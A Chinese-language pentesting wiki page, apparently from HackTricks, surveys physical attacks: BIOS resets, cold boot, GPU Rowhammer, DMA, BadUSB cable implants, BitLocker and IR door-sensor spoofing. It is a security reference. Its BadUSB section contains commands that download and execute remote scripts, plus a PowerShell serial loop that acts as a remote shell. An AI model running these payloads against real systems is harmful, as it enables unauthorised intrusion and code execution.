# 物理攻击

{{#include ../banners/hacktricks-training.md}}

## BIOS 密码恢复与系统安全

旧式 PC 固件设置可能通过断开 CMOS 电池或使用文档中说明的 clear-CMOS 跳线来重置。所需的断电时间取决于主板，现代 UEFI 密码或密钥可能存储在非易失性闪存、嵌入式控制器或安全设备中，因此在取出电池后仍会保留。在短接引脚前，请查阅主板/维修手册；此操作还可能使 TPM 测量失效，并触发磁盘加密恢复。

在旧式 x86 系统上，**killCMOS** 和 **CmosPwd** 等工具可以从可启动环境中检查或修改由 CMOS 保存的设置。CmosPwd 可识别一组文档中记录的旧式 BIOS 系列的密码格式，并能备份、恢复或擦除/终止 CMOS 状态；其公开构建版本面向旧式 DOS/Windows、Linux、FreeBSD 和 NetBSD 环境。<sup>[[18]](#references)</sup> 这些工具不是通用的 UEFI 密码移除工具，并且需要足够的硬件/固件访问权限。

某些笔记本电脑固件在多次密码尝试失败后会显示供应商特定的挑战代码。[bios-pw.org](https://bios-pw.org) 等数据库可以为部分型号推导旧式供应商恢复密码，但许多系统会实施无法通过挑战代码推导密码的锁定机制。请将任何生成的密码视为特定于型号的密码，并避免耗尽永久性尝试计数器。

### UEFI 安全

对于现代 **UEFI** 系统，CHIPSEC 可以审计 Secure Boot 变量保护。请先运行下面的非修改性检查；可选的 `-a modify` 模式会刻意尝试破坏变量，因此只能在可恢复的实验室系统上使用。CHIPSEC 自身警告称，其特权驱动程序和低级硬件访问不适用于生产终端。<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM 分析与 Cold Boot 攻击

DRAM 不会在刷新停止后立即丢失每一位数据。衰减速率会因模块技术和温度而显著变化；冷却可以让有用数据保存的时间远长于未冷却的断电重启。Cold-boot attack 会快速重启进入小型 acquisition environment，或转移经过冷却的模块，捕获原始内存，并在位衰减的情况下重建加密密钥。磁盘复制工具并不自动等同于物理内存成像工具，而 Volatility 分析的是已捕获的数据，而不是负责获取数据；应使用适用于目标平台且经过验证的 acquisition tool。<sup>[[12]](#references)</sup>

---

## 针对页表的 GPU Rowhammer

现代 GPU Rowhammer 攻击在针对 **GPU virtual-memory metadata** 而非普通缓冲区时会更加有效。近期针对 **GDDR6 NVIDIA Ampere GPUs** 的研究表明，攻击者可以运行非特权 CUDA 代码，构建 GPU 专用的 hammering patterns，使用 **memory massaging** 将 paging structures 放置在易受攻击的行中，然后翻转 **last-level page table** 或中间 **page directory** 中的位。一旦单个 translation entry 被破坏，攻击者就可以建立 **arbitrary GPU memory read/write**，随后 pivot 到主机入侵。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. 在 GDDR6 中 **profile hammerable rows**，并构建能够感知 refresh、非均匀的 hammering patterns，以绕过 DRAM 内置缓解措施。
2. **Massage GPU allocations**，使 driver 将 page-translation structures 放置在可 hammer 的物理位置，而不是保留在默认的受保护池中。实际操作中，这可能意味着耗尽低内存 page-table region，并以受控步长大量 spray 稀疏的 UVM mappings。
3. **Flip translation metadata**，例如 page-table / page-directory entry 内的 **PFN** 或与 aperture 相关的位，使攻击者控制的虚拟页解析到 page-table pages、arbitrary GPU memory 或主机可见的 system mappings。
4. 重用伪造的 mapping，重写其他 translation entries，并跨 GPU contexts 提升到 **arbitrary GPU memory read/write**。

### Host Pivot and Mitigations

- 在 **IOMMU disabled** 的情况下，伪造的 system-aperture mappings 可以向 GPU 暴露任意 **host physical memory**，将 GPU primitive 转化为完整的主机入侵。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** 针对 last-level page-table entries，而 **GeForge** 表明，破坏 page-directory level 可能更容易，因为一次位翻转就能重新指向更大的 translation subtree。不要只将某一层 paging layer 视为安全关键层。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** 仍然十分重要，因为它可以阻止 GDDRHammer/GeForge 使用的直接任意主机内存路径，但它**不是完整的缓解措施**。**GPUBreach** 展示了第二阶段的 pivot：攻击者破坏 GPU 可写、由 driver 所有的 CPU buffers，然后触发 NVIDIA driver 的 memory-safety bugs，以获得 kernel write primitive；即使启用了 IOMMU，也可以取得 **root shell**。<sup>[[3]](#references)</sup>
- 在受支持的 workstation/server GPUs 上，**system-level ECC** 是一种实用的加固措施。没有 ECC 的 consumer GPUs 暴露出更弱的防御面。<sup>[[4]](#references)</sup>
- 这些攻击并非纯粹理论上的：**GeForge** 在 RTX 3060 上报告了 **1,171** 次位翻转，在 RTX A6000 上报告了 **202** 次，足以构建有效的主机权限提升链。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) 攻击

对于可以降低 pre-boot IOMMU enforcement 并启用 Windows DMA chain 的离线 UEFI IFR/NVRAM patching，请参阅：

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** 演示了通过 FireWire 和早期 Thunderbolt configurations 等接口执行 **DMA-based memory acquisition and patching**，其中包括历史上的 login-bypass signatures。它并非简单地“对 Windows 10 无效”：exploitability 取决于接口、目标 build、IOMMU policy、lock state，以及是否支持并启用了 Windows Kernel DMA Protection。Windows 10 version 1803 及更高版本在兼容平台上引入了 Kernel DMA Protection，显著改变了攻击面。<sup>[[13]](#references)[[14]](#references)</sup>

---

## 用于系统访问的 Live CD/USB

在未加密或已解锁的 Windows volume 上，离线环境可以将 **sethc.exe** 或 **Utilman.exe** 等 accessibility binaries 替换为 **cmd.exe**，从而在对应的登录屏幕快捷键运行时获得 SYSTEM command prompt。**chntpw** 等工具可以编辑本地 SAM account data。这些方法无法绕过已锁定的 BitLocker volume，并且可能损坏受 DPAPI/EFS 保护的 credentials；应保留 forensic copies 和 backups。

**Kon-Boot** 是一款针对受支持 Windows/macOS configurations 的 commercial boot-time authentication-bypass tool。兼容性取决于 OS、firmware mode、Secure Boot 和 disk-encryption setup；它不会解密已锁定的 BitLocker volume。<sup>[[10]](#references)</sup>

---

## 处理 Windows 安全功能

### Boot and Recovery Shortcuts

- **Delete/Supr**、F2、F10 或其他 vendor key 可能打开 firmware setup。
- **F8** 仅在仍启用该路径的 configurations 上进入 legacy Windows advanced boot options；当前的 recovery entry 方式有所不同。
- 按住 **Shift** 可以在某些 configurations 中抑制 Windows automatic logon，但 policy/registry settings 可能禁用该行为。<sup>[[17]](#references)</sup>

### BAD USB 设备

**USB Rubber Ducky** 和 Teensy boards 等设备可以枚举为受信任的 HID keyboards，并注入预定义的 keystrokes。payload 最初拥有已登录 session 的 privileges 和 desktop access；UAC prompts、screen locking、keyboard layout、timing 以及 endpoint USB policy 仍会对其形成限制。<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator 或 backup privileges 可以创建 shadow copy 或保存 registry hives，从而获取 **SAM** 和 **SYSTEM** 等锁定文件。这是一种 post-compromise collection technique，而不是 privilege bypass，应与 `diskshadow`/VSS 和 registry-hive export events 进行关联分析。

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- 基于 ESP32-S3 的 implants（例如 **Evil Crow Cable Wind**）隐藏在 USB-A→USB-C 或 USB-C↔USB-C cables 内部，仅作为 USB keyboard 进行枚举，并通过 Wi-Fi 暴露其 C2 stack。操作员只需从 victim host 为 cable 供电，创建名称为 `Evil Crow Cable Wind`、密码为 `123456789` 的 hotspot，然后浏览 [http://cable-wind.local/](http://cable-wind.local/)（或其 DHCP address）即可访问嵌入式 HTTP interface。<sup>[[8]](#references)</sup>
- 浏览器 UI 提供 *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell* 和 *Config* tabs。存储的 payloads 按 OS 标记，keyboard layouts 可以动态切换，VID/PID strings 也可以修改为模拟已知 peripherals。
- 由于 C2 位于 cable 内部，手机可以 stage payloads、触发执行并管理 Wi-Fi credentials，而无需使用组织的 network——这对短驻留时间的 physical intrusions 很有用。

### OS-aware AutoExec payloads

- AutoExec rules 将一个或多个 payloads 绑定为在 USB enumeration 后立即触发。implant 执行轻量级 OS fingerprinting，并选择匹配的 script。
- Example workflow：
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
- *macOS/Linux:* `COMMAND SPACE`（Spotlight）或 `CTRL ALT T`（terminal）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 由于执行过程无需人工操作，仅替换充电 cable 就可以在已登录用户 context 下实现“plug-and-pwn” initial access。

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap：**存储的 payload 打开 console，并粘贴一个 loop，执行新 USB serial device 接收到的任意内容。一个最小化的 Windows variant 是：
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge：** 该 implant 会保持 USB CDC channel 开放，同时其 ESP32-S3 启动一个 TCP client（Python script、Android APK 或 desktop executable）连接回 operator。TCP session 中输入的任何字节都会被转发到上面的 serial loop，从而即使在 air-gapped hosts 上也能实现 remote command execution。输出受限，因此 operator 通常会执行 blind commands（创建账户、staging additional tooling 等）。

### HTTP OTA update surface

- 文档记录的 Evil Crow Cable Wind interface 在 `/update` 处暴露了一个无需 authentication 的 firmware-update endpoint：<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (例如，flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## 绕过 BitLocker Encryption

对正在运行或最近运行过的系统进行授权取证获取时，在卷处于解锁状态期间，可能包含 BitLocker volume master key 或相关密钥材料。Elcomsoft Forensic Disk Decryptor 和 Passware Kit Forensic 等商业工具可以搜索受支持的内存映像、休眠文件或崩溃转储，但不保证成功。启用 BitLocker 后，现代 Windows 还会对崩溃转储进行加密；而存储的 48 位 recovery password 与内存中的 volume key 是不同的 artifact。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 通过 Social Engineering 添加 Recovery Key

攻击者如果说服管理员运行 BitLocker-management commands，就可以添加 recovery-password、external-key 或其他 protector，然后将其捕获。recovery password 不能是任意的零字符串：BitLocker numerical recovery passwords 必须符合经过验证的 48 位格式。相关的授权管理语法是 `manage-bde -protectors -add C: -recoverypassword`；使用 `manage-bde -protectors -get C:` 列出生成的 protectors。监控 protector 的添加，并确保新的 recovery material 仅 escrow 到获批准的位置。<sup>[[16]](#references)</sup>

---

## 利用 Chassis Intrusion / Maintenance Switches 将 BIOS 恢复出厂设置

许多现代笔记本电脑和小型台式机都包含一个由 Embedded Controller (EC) 及 BIOS/UEFI firmware 监控的 **chassis-intrusion switch**。该开关的主要用途是在设备被打开时发出警报，但厂商有时会实现一种**未公开的 recovery shortcut**，在开关按照特定模式切换时触发。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻击原理

1. 该开关连接到 EC 上的 **GPIO interrupt**。
2. 在 EC 上运行的 firmware 会记录**按压的时序和次数**。
3. 识别出硬编码模式后，EC 会调用 *mainboard-reset* routine，**擦除系统 NVRAM/CMOS 的内容**。
4. 下一次启动时，受影响的型号会加载重置后的 firmware state。根据厂商和 revision 的不同，被清除的状态可能包括 supervisor password、自定义 boot settings 或已注册的 Secure Boot keys；TPM state 和 disk-encryption effects 必须另行评估。

> firmware reset 可能会恢复 external-boot options，但**不会**解密存储设备。BitLocker 或其他 full-disk encryption system 可能在 TPM/firmware 发生更改后进入 recovery，同时在没有 recovery key 的情况下继续保护内部驱动器。<sup>[[16]](#references)</sup>

### 真实案例 – Framework 13 Laptop

Framework 13（11th/12th/13th-gen）的 recovery shortcut 是：
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
第十个循环后，EC 会设置一个标志，指示 BIOS 在下一次重启时擦除 NVRAM。整个过程耗时约 40 秒，**只需要一把螺丝刀**。<sup>[[5]](#references)</sup>

### 通用 Exploitation 流程

1. 开机或执行挂起-恢复操作，使 EC 处于运行状态。
2. 拆下底盖，露出入侵/维护开关。
3. 重现供应商特定的切换模式（查阅文档、论坛，或对 EC 固件进行逆向工程）。
4. 重新组装并重启，然后检查实际发生变化的固件设置和凭据。
5. 如果获得授权且支持外部启动，则启动受控的 live image。内部卷被合法解锁后（或从未加密），live 环境可以获取凭据和数据，或检查 EFI System Partition。修改该分区以安装 EFI implant 具有持久性且侵入性很高，并且仍受 Secure Boot、measured boot、固件写保护和端点监控的限制。没有密钥或恢复材料时，加密存储仍无法访问。

### 检测与缓解

* 在 OS 管理控制台中记录机箱入侵事件，并与异常 BIOS 重置进行关联。
* 在螺丝/外壳上使用**防拆封条**，以检测是否被打开。
* 将设备放置在**物理受控区域**；假设物理访问等同于完全失陷。
* 在可用的情况下，禁用供应商的“maintenance switch reset”功能，或要求对 NVRAM 重置进行额外的加密授权。

---

## 针对 No-Touch 出门传感器的隐蔽 IR 注入

### 传感器特征
- 商品化的“挥手出门”传感器将近 IR LED 发射器与类似电视遥控器的接收器模块配对；只有在检测到多个（约 4–10 个）正确载波（约 30 kHz）脉冲后，才会报告逻辑高电平。<sup>[[7]](#references)</sup>
- 塑料护罩阻止发射器和接收器直接相互对准，因此控制器会假设任何经过验证的载波都来自附近反射，并驱动继电器打开门锁。
- 控制器认定目标存在后，通常会改变出站调制包络，但接收器仍会接受任何与经过滤波的载波匹配的突发信号。

### 攻击流程
1. **捕获发射特征** —— 在控制器引脚之间接入逻辑分析仪，记录驱动内部 IR LED 的检测前和检测后波形。
2. **仅重放“检测后”波形** —— 移除/忽略原装发射器，并从一开始就使用已经触发的模式驱动外部 IR LED。由于接收器只关注脉冲数量/频率，因此会将 spoofed carrier 视为真实反射，并使继电器线路进入有效状态。
3. **控制传输时序** —— 以经过调谐的突发信号发送载波（例如，开启数十毫秒，关闭相近时长），在不使接收器的 AGC 或干扰处理逻辑饱和的情况下提供最低脉冲数量。连续发射会迅速使传感器灵敏度下降，并阻止继电器触发。

### 远距离反射式注入
- 将实验台 LED 替换为高功率 IR 二极管、MOSFET 驱动器和聚焦光学元件后，即可在约 6 米外可靠触发。
- 攻击者不需要与接收器孔径保持视线；将光束对准玻璃可见的室内墙面、货架或门框，反射能量即可进入约 30° 的视场，模拟近距离挥手。
- 由于接收器只预期检测微弱反射，更强的外部光束可以从多个表面反射后仍保持在检测阈值之上。

### 武器化攻击手电筒
- 将驱动器嵌入商用手电筒可以把工具隐藏在普通物品中。将可见光 LED 替换为与接收器频段匹配的高功率 IR LED，加入 ATtiny412（或类似器件）以生成约 30 kHz 的突发信号，并使用 MOSFET 吸收 LED 电流。
- 可伸缩变焦镜头可以收窄光束以提高射程/精度，而由 MCU 控制的振动马达则可在不发出可见光的情况下，提供调制已启用的触觉确认。
- 在多个已存储的调制模式之间循环（使用略有不同的载波频率和包络）可以提高对不同贴牌传感器系列的兼容性，使操作者能够扫描反射表面，直到继电器发出咔哒声并释放门锁。

---

## References

- [1] [GDDRHammer：严重扰乱 DRAM 行 —— 来自现代 GPU 的跨组件 Rowhammer 攻击](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge：锤击 GDDR 内存以伪造 GPU 页表，兼为乐趣与收益](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach：使用 Rowhammer 对 GPU 发起的权限提升攻击](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - 安全公告：Rowhammer - 2025 年 7 月](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13：按这里即可 pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – 主板重置指南](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “不要碰！——使用隐蔽 IR 手电筒绕过 IR No-Touch 出门传感器”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “即插即用即 pwn：使用 Evil Crow Cable Wind 进行 Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - 针对 NVIDIA 芯片的 Rowhammer 攻击](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot 官方文档和兼容性信息](https://kon-boot.com/)
- [11] [CHIPSEC 文档 - Secure Boot 变量保护](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [谨防遗忘：针对加密密钥的冷启动攻击](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - 通过 DMA 操作物理内存](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky 文档](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker 操作指南](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - 按住 Shift 键与自动登录行为](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd 文档和下载](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
